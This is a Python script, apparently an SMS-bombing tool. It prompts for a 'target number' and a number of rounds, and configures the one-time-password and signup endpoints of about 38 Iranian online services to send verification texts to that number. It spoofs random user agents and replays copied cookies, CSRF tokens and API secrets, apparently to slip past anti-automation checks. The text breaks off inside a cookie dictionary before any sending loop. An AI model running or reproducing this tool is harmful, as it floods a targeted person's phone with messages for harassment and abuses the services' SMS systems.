import json
import requests
from fake_useragent import UserAgent
from time import sleep
from user_agent import generate_user_agent

fake = UserAgent()


headers = {'User-Agent':fake.random,'Pragma': 'no-cache', 'Accept': 'application/json'}



num = (input("Enter target number: "))
chanta = int(input("Enter round: "))
num0 = num[1:11]

url1 = "https://api.divar.ir/v5/auth/authenticate"
url1s = {"phone":num}

url2 = f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={num}"
url2s = {"cellphone": num}

url3 = f"https://core.gap.im/v1/user/add.json?mobile=%2B98{num0}"

url4 = "https://www.sheypoor.com/api/v10.0.0/auth/send"
url4s = {"username":num}

url5 = "https://restaurant.delino.com/user/register"
url5s = {"apiToken":"10tQStiKTniALgYpYQ4hm0UCuadXWbHdMklMIpyTE5DSzkNSfx1r2p02pqg3QKx3","clientSecret":"MZ0TNC0swsGFk6gbfCdvtZHRukZyFntu","device":"web","username":num}

url6 = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
url6s = {"phoneNumber": num}

url7 = "https://pinket.com/api/cu/v2/phone-verification"
url7s = {"phoneNumber": num}

url8 = "https://app.itoll.com/api/v1/auth/login"
url8s = {"mobile": num}

url9 = "https://api.karnameh.com/v1/carinspection/auth/authenticate"
url9s = {"phone":num}

url10 = "https://auth.basalam.com/otp-request"
url10s = {"mobile": num, "client_id": 11}

url11 = "https://mobapi.banimode.com/api/v2/auth/request"
url11s = {"phone":num}

url12 = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={num}"
url12s = {"cellphone": num}

url13 = "https://www.mydigipay.com/digipay/api/users/send-sms"
url13s = {"cellNumber":num,"device":{"deviceId":"d520c7a8-421b-4563-b955-f5abc56b97ec","deviceModel":"Windows/Chrome","deviceAPI":"WEB_BROWSER","osName":"WEB"}}

url14 = "https://abantether.com/users/register/phone/send/"
url14s = {"phoneNumber": num, "email": ""}

url15 = "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode"
url15s = {"Parameters":{"ApplicationType":"Web","ApplicationUniqueToken":"null","ApplicationVersion":"1.0.0","MobileNumber":num,"UniqueToken":"null"}}

url16 = "https://khodro45.com/api/v1/customers/otp/"
url16s = {"mobile":num}

url17 = "https://api.ostadkr.com/login"
url17s = {"mobile":num}

url18 = "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile"
url18s = {"mobile":num,"country_code":"98"}

url19 = "https://api.digikalajet.ir/user/login-register/"
url19s = {"phone": num}

url20 = "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/"
url20s = {"phone":num}

url21 = "https://www.miare.ir/api/otp/client/request/"
url21s = {"phone_number":num}

url22 = "https://gw.taaghche.com/v4/site/auth/signup"
url22s = {"contact":num}

url23 = "https://taraazws.jabama.com/api/v4/account/send-code"
url23s = {"mobile":num}

url24 = "https://next.zarinpal.com/api/oauth/register"
url24s = {"first_name": "بمبر", "last_name": "سسلام", "cell_number": num}

url25 = "https://drdr.ir/api/v3/auth/login/mobile/init"

cookies25 = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'a4ff710c-fb41-dbe5-b76b-76642dda2aca',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_gcl_au': '1.1.1781847905.1693559284',
    '_ga_366FTBNK6W': 'GS1.1.1693571905.2.0.1693571905.0.0.0',
    'analytics_session_token': '82624adc-b004-9dc6-eed9-538b8071763c',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    '_ga': 'GA1.2.219175219.1693559284',
    '_gid': 'GA1.2.1146854326.1693652823',
    '_gat_UA-101159391-1': '1',
    '_clck': 'ihvhkd|2|feo|0|1339',
    'crisp-client%2Fsession%2F929a93f7-17ea-492e-a5c1-3b1fd45f86b9': 'session_2c7984dc-6887-44f1-b01b-f0e9020a25c9',
    '_clsk': 'z52f4d|1693652825295|1|0|u.clarity.ms/collect',
    '_ga_VPMXG7C0RF': 'GS1.1.1693652822.3.1.1693652843.39.0.0',
}

headers25 = {
    'authority': 'drdr.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'no-store, max-age=0',
    'client-id': 'f60d5037-b7ac-404a-9e3a-a263fd9f8054',
    'content-type': 'application/json',
    # 'cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=a4ff710c-fb41-dbe5-b76b-76642dda2aca; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _gcl_au=1.1.1781847905.1693559284; _ga_366FTBNK6W=GS1.1.1693571905.2.0.1693571905.0.0.0; analytics_session_token=82624adc-b004-9dc6-eed9-538b8071763c; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; _ga=GA1.2.219175219.1693559284; _gid=GA1.2.1146854326.1693652823; _gat_UA-101159391-1=1; _clck=ihvhkd|2|feo|0|1339; crisp-client%2Fsession%2F929a93f7-17ea-492e-a5c1-3b1fd45f86b9=session_2c7984dc-6887-44f1-b01b-f0e9020a25c9; _clsk=z52f4d|1693652825295|1|0|u.clarity.ms/collect; _ga_VPMXG7C0RF=GS1.1.1693652822.3.1.1693652843.39.0.0',
    'origin': 'https://drdr.ir',
    'referer': 'https://drdr.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
}

json_data25 = {
    'mobile': num0,
}


url26 = "https://www.drsaina.com/RegisterLogin"
cookies26 = {
    '_gcl_au': '1.1.1722113967.1693570729',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}',
    'analytics_token': 'c3737ae6-fe40-3fd2-4df0-d283d8b71cb7',
    '_gid': 'GA1.2.1501739126.1693570730',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_gcl_aw': 'GCL.1693635738.Cj0KCQjwl8anBhCFARIsAKbbpyQRY-PnJd-TI9tr-8DIX9LOpzPEg-OLD6eufVdDaJk4-Obqy4Zb_S0aApdkEALw_wcB',
    'yektanet_session_last_activity': '9/2/2023',
    '_gac_UA-126198313-1': '1.1693635741.Cj0KCQjwl8anBhCFARIsAKbbpyQRY-PnJd-TI9tr-8DIX9LOpzPEg-OLD6eufVdDaJk4-Obqy4Zb_S0aApdkEALw_wcB',
    '.AspNetCore.Antiforgery.ej9TcqgZHeY': 'CfDJ8LAHk8-NI5hBqr_jKzR9ilJhBNKoE6klFn9M21uuOEvWlJ7-gOzY_k-iQmMpgCN3I7iyrA0UEsFfqu_Uj0mgI35MWeY47yfjspATjp-Vv8NZjFeUwEV53agYr35GzQys-QrqgGaK20mbnVNCgDmZVos',
    'MEDIAAD_USER_ID': '652b79ba-1154-40f7-a577-9788d6bbd169',
    '_yngt_iframe': '1',
    '_ga': 'GA1.2.1165757217.1693570729',
    '_ga_TZ59YW6Z4C': 'GS1.1.1693648612.5.1.1693648713.22.0.0',
}

headers26 = {
    'authority': 'www.drsaina.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gcl_au=1.1.1722113967.1693570729; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=c3737ae6-fe40-3fd2-4df0-d283d8b71cb7; _gid=GA1.2.1501739126.1693570730; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _gcl_aw=GCL.1693635738.Cj0KCQjwl8anBhCFARIsAKbbpyQRY-PnJd-TI9tr-8DIX9LOpzPEg-OLD6eufVdDaJk4-Obqy4Zb_S0aApdkEALw_wcB; yektanet_session_last_activity=9/2/2023; _gac_UA-126198313-1=1.1693635741.Cj0KCQjwl8anBhCFARIsAKbbpyQRY-PnJd-TI9tr-8DIX9LOpzPEg-OLD6eufVdDaJk4-Obqy4Zb_S0aApdkEALw_wcB; .AspNetCore.Antiforgery.ej9TcqgZHeY=CfDJ8LAHk8-NI5hBqr_jKzR9ilJhBNKoE6klFn9M21uuOEvWlJ7-gOzY_k-iQmMpgCN3I7iyrA0UEsFfqu_Uj0mgI35MWeY47yfjspATjp-Vv8NZjFeUwEV53agYr35GzQys-QrqgGaK20mbnVNCgDmZVos; MEDIAAD_USER_ID=652b79ba-1154-40f7-a577-9788d6bbd169; _yngt_iframe=1; _ga=GA1.2.1165757217.1693570729; _ga_TZ59YW6Z4C=GS1.1.1693648612.5.1.1693648713.22.0.0',
    'origin': 'https://www.drsaina.com',
    'referer': 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

params26 = {
    'ReturnUrl': '/consultation',
}

data26 = {
    '__RequestVerificationToken': 'CfDJ8LAHk8-NI5hBqr_jKzR9ilLPQe8BFQWgVZSRYv90UPiAAqgH8ahD2l4FsVgEODpgV2ZDmdONXVNW2MOO6t7Cy0QgdlLhGiNPjhvHwNeOHN1otbneERVJQh_R3Kv6oY_sIdmBFiKir1OXdTz6dhNWCVM',
    'noLayout': 'False',
    'action': 'checkIfUserExistOrNot',
    'lId': '',
    'codeGuid': '00000000-0000-0000-0000-000000000000',
    'PhoneNumber': num,
    'confirmCode': '',
    'fullName': '',
    'Password': '',
    'Password2': '',
}

url27 = "https://atawich.com/Account/FoodPhoneNumberVerification/"

cookies27 = {
    'timeZone': '',
    'wm1400': 'CfDJ8KS4pps4EFJEhn0uMhvZWqmH1nfcv-l5fl7IIG7KtbpMHHS6B_BfuJptcggYuDaUUNs9VGTq39soeKPE4f4eg054PA8KzfFwRDdDaGWQ18bcK-WVcMtHUYMkbLvWnAbze3ZQpzxezMmTQufw5D_ZsFA',
    'v_referrer': 'www.google.com',
    'v_url': '%2F',
    'BasketID': '86792076',
    'checkTextTrnslateLan': 'fa',
    'BB6BCBB84C4117563D4C936F1EF357E094744274': 'D8CE909A434FF4358F075CCC81C4F99534C75E9A',
    '.AspNetCore.Antiforgery.C8JE6cPNpd8': 'CfDJ8KS4pps4EFJEhn0uMhvZWqlmkQb42LxfVEmSAKRhJrhGR-BhUw1k5RsIjSyGJCkhpnDfCFrcKTkdYOrIh_dNr6ny6nLbOGQQ6TL4-BdDL_oO6MmNIUdQsGF9ztpwPcO3zSZ_ZWwAiTB-ekvxzq1NAI0',
    '.AspNetCore.Session': 'CfDJ8KS4pps4EFJEhn0uMhvZWqkzevy7LH%2Bp346MQTnWP%2BCoRdkuDD2iPb%2FDlf3xXqRUe9uHwEZhhQM9u5mQfjEfiPFVHmpIHiH7eK4cdYbLFXPglQeW6UwQ2vNPgX3SUCW0nMb6%2BHL0LrXoYaii%2F6QMzGp23yMKYBw1LXYbdq%2BisJq2',
    '_ga': 'GA1.2.1387567309.1693653542',
    '_gid': 'GA1.2.879449029.1693653564',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '80462134-d914-4405-ed97-95f732ffb9f4',
    'analytics_session_token': 'ab153966-4147-3a90-a35a-c9e7d3d6c6b1',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    'dishSeparateKind': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_ga_1BSZGWBHMR': 'GS1.1.1693653541.1.1.1693654095.0.0.0',
    '_ga_J1E5M6VQYF': 'GS1.1.1693653561.1.1.1693654095.0.0.0',
}

headers27 = {
    'authority': 'atawich.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'timeZone=; wm1400=CfDJ8KS4pps4EFJEhn0uMhvZWqmH1nfcv-l5fl7IIG7KtbpMHHS6B_BfuJptcggYuDaUUNs9VGTq39soeKPE4f4eg054PA8KzfFwRDdDaGWQ18bcK-WVcMtHUYMkbLvWnAbze3ZQpzxezMmTQufw5D_ZsFA; v_referrer=www.google.com; v_url=%2F; BasketID=86792076; checkTextTrnslateLan=fa; BB6BCBB84C4117563D4C936F1EF357E094744274=D8CE909A434FF4358F075CCC81C4F99534C75E9A; .AspNetCore.Antiforgery.C8JE6cPNpd8=CfDJ8KS4pps4EFJEhn0uMhvZWqlmkQb42LxfVEmSAKRhJrhGR-BhUw1k5RsIjSyGJCkhpnDfCFrcKTkdYOrIh_dNr6ny6nLbOGQQ6TL4-BdDL_oO6MmNIUdQsGF9ztpwPcO3zSZ_ZWwAiTB-ekvxzq1NAI0; .AspNetCore.Session=CfDJ8KS4pps4EFJEhn0uMhvZWqkzevy7LH%2Bp346MQTnWP%2BCoRdkuDD2iPb%2FDlf3xXqRUe9uHwEZhhQM9u5mQfjEfiPFVHmpIHiH7eK4cdYbLFXPglQeW6UwQ2vNPgX3SUCW0nMb6%2BHL0LrXoYaii%2F6QMzGp23yMKYBw1LXYbdq%2BisJq2; _ga=GA1.2.1387567309.1693653542; _gid=GA1.2.879449029.1693653564; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=80462134-d914-4405-ed97-95f732ffb9f4; analytics_session_token=ab153966-4147-3a90-a35a-c9e7d3d6c6b1; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; dishSeparateKind=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _ga_1BSZGWBHMR=GS1.1.1693653541.1.1.1693654095.0.0.0; _ga_J1E5M6VQYF=GS1.1.1693653561.1.1.1693654095.0.0.0',
    'origin': 'https://atawich.com',
    'referer': 'https://atawich.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

params27 = {
    'lazyLoad': 'true',
    'btnID': 'undefined',
}

data27 = {
    'PhoneNumber': num,
    'call': 'false',
    'data1': '173702fc-a22f-4de5-a3dc-b52cd00806d3',
    'data2': '638292627215757560',
    'ForgetPass': 'false',
}

url28 = "https://seniorebrahimi.com/account/login/"

cookies28 = {
    'csrftoken': 'QTz41ugQ5uqxkY1MGWJDAYkoK0CtQwyo',
}

headers28 = {
    'authority': 'seniorebrahimi.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'csrftoken=QTz41ugQ5uqxkY1MGWJDAYkoK0CtQwyo',
    'origin': 'https://seniorebrahimi.com',
    'referer': 'https://seniorebrahimi.com/account/login/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

data28 = {
    'csrfmiddlewaretoken': 'prfoTP75mb6eo7DYnuykRTaVuYjZzbun5aEiK9dLhvmByVuATg7NhHk94OLifxSB',
    'mobile': num,
}

url29 = "https://sandbox.sibbazar.com/api/v1/user/invite"
headers29 = {
    'authority': 'sandbox.sibbazar.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://developer.sibbazar.com',
    'referer': 'https://developer.sibbazar.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

json_data29 = {
    'username': num,
}




url30 = "https://core.gapfilm.ir/api/v3.1/Account/Login"
headers30 = {
    'authority': 'core.gapfilm.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'fa',
    'advertiseid': 'Mozilla/5.0 (Windows NT 10.0; Win64;',
    'androidid': 'Mozilla/5.0 (Windows NT 10.0; Win64;',
    'browser': 'Chrome',
    'browserversion': '116.0.0.0',
    'content-type': 'application/json',
    'devicemodel': 'Mozilla/5.0 (Windows NT 10.0; Win64;',
    'origin': 'https://www.gapfilm.ir',
    'os': 'Windows',
    'osversion': 'NT 10.0',
    'referer': 'https://www.gapfilm.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sourcechannel': 'GF_WebSite',
    'sourceenvironment': 'Website',
    'user-agent': fake.random,
}

json_data30 = {
    'Type': 3,
    'Username': num0,
    'SourceChannel': 'GF_WebSite',
    'SourcePlatform': 'desktop',
    'SourcePlatformAgentType': 'Chrome',
    'SourcePlatformVersion': '116.0.0.0',
    'GiftCode': None,
}

url31 = "https://nobat.ir/api/public/patient/login/phone"
headers31 = {
    'authority': 'nobat.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'authorization': 'Bearer undefined',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryiYaSBjIEl7kfJIrF',
    'nobat-cookie': '{"_ga":"GA1.1.2103201941.1693570182","defaultCity":"34","_ga_KEKNLD11WM":"GS1.1.1693655736.2.1.1693655807.0.0.0"}',
    'origin': 'https://user.nobat.ir',
    'referer': 'https://user.nobat.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

data31 = f'------WebKitFormBoundaryiYaSBjIEl7kfJIrF\r\nContent-Disposition: form-data; name="mobile"\r\n\r\n{num0}\r\n------WebKitFormBoundaryiYaSBjIEl7kfJIrF\r\nContent-Disposition: form-data; name="use_emta_v2"\r\n\r\nyes\r\n------WebKitFormBoundaryiYaSBjIEl7kfJIrF\r\nContent-Disposition: form-data; name="domain"\r\n\r\nnobat\r\n------WebKitFormBoundaryiYaSBjIEl7kfJIrF--\r\n'


url32 = "https://shahrfarsh.com/Account/Login"
cookies32 = {
    '_gid': 'GA1.2.548925594.1693658664',
    'analytics_token': 'f39de2b5-3c55-7389-673b-413127403d89',
    'analytics_session_token': '0530c68e-2605-27b7-81c2-eb070e56ce5f',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_ga_BNFE2XCVSW': 'GS1.1.1693658665.1.0.1693658665.0.0.0',
    '_ga': 'GA1.1.919520603.1693658664',
    '_ym_uid': '1693658666830688261',
    '_ym_d': '1693658666',
    '_ym_isad': '2',
    '_ym_visorc': 'w',
}

headers32 = {
    'authority': 'shahrfarsh.com',
    'accept': 'text/plain, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '_gid=GA1.2.548925594.1693658664; analytics_token=f39de2b5-3c55-7389-673b-413127403d89; analytics_session_token=0530c68e-2605-27b7-81c2-eb070e56ce5f; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _ga_BNFE2XCVSW=GS1.1.1693658665.1.0.1693658665.0.0.0; _ga=GA1.1.919520603.1693658664; _ym_uid=1693658666830688261; _ym_d=1693658666; _ym_isad=2; _ym_visorc=w',
    'origin': 'https://shahrfarsh.com',
    'referer': 'https://shahrfarsh.com/Account/Login',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data32 = {
    'phoneNumber': num,
}


url33 = "https://dicardo.com/main/sendsms"
cookies33 = {
    'PHPSESSID': '7b673c5a9b692aff39fea79e3ceb01dce0ee3213',
    'theme': 'dark',
}

headers33 = {
    'authority': 'dicardo.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=7b673c5a9b692aff39fea79e3ceb01dce0ee3213; theme=dark',
    'origin': 'https://dicardo.com',
    'referer': 'https://dicardo.com/register',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data33 = {
    'phone': num,
    'type': '0',
    'codmoaref': '',
}


url34 = "https://rezagem.com/wp-admin/admin-ajax.php"
cookies34 = {
    'd_user_session': 'bd4aa317fe440de1aedb66f5fcbaa7d773da8fcd28532570b8eb98aac6a6bb1ce6a6cef0755afb88141b89d7c6dd1f65a605c49d46ee501b1016fa56d4aad5a6',
}

headers34 = {
    'authority': 'rezagem.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'd_user_session=bd4aa317fe440de1aedb66f5fcbaa7d773da8fcd28532570b8eb98aac6a6bb1ce6a6cef0755afb88141b89d7c6dd1f65a605c49d46ee501b1016fa56d4aad5a6',
    'origin': 'https://rezagem.com',
    'referer': 'https://rezagem.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data34 = {
    'action': 'digits_check_mob',
    'countrycode': '+98',
    'mobileNo': num0,
    'csrf': '1e88bd4519',
    'login': '1',
    'username': '',
    'email': '',
    'captcha': '',
    'captcha_ses': '',
    'digits': '1',
    'json': '1',
    'whatsapp': '0',
    'mobmail': num0,
    'dig_otp': '',
    'dig_nounce': '1e88bd4519',
}

url35 = "https://api.bitpin.ir/v2/usr/signin/"
url35s = {"phone":num}

url36 = "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest"
headers36 = {
    'authority': 'api.cafebazaar.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://cafebazaar.ir',
    'referer': 'https://cafebazaar.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

json_data36 = {
    'properties': {
        'language': 2,
        'clientID': 'spqv28hi7u3la0bcrdtamburaz0y3acs',
        'deviceID': 'spqv28hi7u3la0bcrdtamburaz0y3acs',
        'clientVersion': 'web',
    },
    'singleRequest': {
        'getOtpTokenRequest': {
            'username': '98' + num0,
        },
    },
}

url37 = "https://panel.idpay.ir/api/v1/user/verification"
url37s = {"number":num,"type":"login"}

url38 = "https://virgool.io/api/v1.4/auth/verify"
cookies38 = {
    'rec': 'eyJpdiI6IldHNUJqZUoyU1p1Z3paRm1rUjNxakE9PSIsInZhbHVlIjoiU2dmQ01icm5CUGN4NTVsd1JMbEoyM1FnTU15cTVKOUxQejY2eTk1QWZkUHlRbmQvdXVYRGZvVGNxdmtTVXhQc2FUWndJL0xXRElPMTNieENYV0V0Z3c9PSIsIm1hYyI6ImMxMmUzMWM2OWIyYWMxODdkYjk3NzZhN2MxOTQ2MDllZDlmYzUwNmVjOTUwNjM1NzJmYjk0OGVhYzdlZmVlMzgiLCJ0YWciOiIifQ%3D%3D',
    '_gid': 'GA1.2.1718242249.1693553219',
    '_gat_gtag_UA_96394274_3': '1',
    '_clck': '1dr1w8b|2|feo|0|1340',
    '_ga': 'GA1.2.887889158.1676390738',
    '_ga_V1LLR5NWKW': 'GS1.1.1693674204.5.1.1693674212.0.0.0',
    'XSRF-TOKEN': 'eyJpdiI6ImtGaEQxRFM5MFNud2xObklHNXowbmc9PSIsInZhbHVlIjoiSGNKWlM3RCttUlBpUW41YXJvbUkxTkg3MGlCVm4vUmw4VVQrN29YcnZDSHh0UkJTRWdTZzJZQ2ZKcXJDalBCZUNrQXhTTW04OXRRY0NZL3BKY0FnbHRpRXhDUzFXT1pDb2ZaZnJoa1YzN3dGa3RiODJHQjN3cEg5RXFIaDVnRlEiLCJtYWMiOiIzNTAyNTA0OWYyNmM1MTAwYzAyZTQ3MjJmMDg4MGNmYmZiMTcwYmUwZGY1MmIzYjkxNzQ1YzdiMDA2MjQyMDMyIiwidGFnIjoiIn0%3D',
    'vrgl_sess': 'eyJpdiI6Imx1QTQzREJKNndmVVY2RGsxMFpwM1E9PSIsInZhbHVlIjoiNzl6WThDSjVsVy9VVWZteEZXZlJDdlBtaWpDdmFadVA2S2pGTDgvZ0x1eFVvQWZYTWlrdG01dFhQV3Qxczl4YWZHVFBFVDloeVNldFdRQWxpR09nNk8xWlJlb0R4NVlncmdHaFlzdTV1Nm9DSDZxaE9xSVhwSDJBTVZQOENDalIiLCJtYWMiOiIzNTE4ZjI2YjdkYmEyNDBmMTU4MzJiMDcxYmM1ZDVlNWJlOWYxODhmMWUyODYwZmI4MzM1MzJhOTlhYTRiOTBmIiwidGFnIjoiIn0%3D',
}

headers38 = {
    'authority': 'virgool.io',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json;charset=UTF-8',
    # 'cookie': 'rec=eyJpdiI6IldHNUJqZUoyU1p1Z3paRm1rUjNxakE9PSIsInZhbHVlIjoiU2dmQ01icm5CUGN4NTVsd1JMbEoyM1FnTU15cTVKOUxQejY2eTk1QWZkUHlRbmQvdXVYRGZvVGNxdmtTVXhQc2FUWndJL0xXRElPMTNieENYV0V0Z3c9PSIsIm1hYyI6ImMxMmUzMWM2OWIyYWMxODdkYjk3NzZhN2MxOTQ2MDllZDlmYzUwNmVjOTUwNjM1NzJmYjk0OGVhYzdlZmVlMzgiLCJ0YWciOiIifQ%3D%3D; _gid=GA1.2.1718242249.1693553219; _gat_gtag_UA_96394274_3=1; _clck=1dr1w8b|2|feo|0|1340; _ga=GA1.2.887889158.1676390738; _ga_V1LLR5NWKW=GS1.1.1693674204.5.1.1693674212.0.0.0; XSRF-TOKEN=eyJpdiI6ImtGaEQxRFM5MFNud2xObklHNXowbmc9PSIsInZhbHVlIjoiSGNKWlM3RCttUlBpUW41YXJvbUkxTkg3MGlCVm4vUmw4VVQrN29YcnZDSHh0UkJTRWdTZzJZQ2ZKcXJDalBCZUNrQXhTTW04OXRRY0NZL3BKY0FnbHRpRXhDUzFXT1pDb2ZaZnJoa1YzN3dGa3RiODJHQjN3cEg5RXFIaDVnRlEiLCJtYWMiOiIzNTAyNTA0OWYyNmM1MTAwYzAyZTQ3MjJmMDg4MGNmYmZiMTcwYmUwZGY1MmIzYjkxNzQ1YzdiMDA2MjQyMDMyIiwidGFnIjoiIn0%3D; 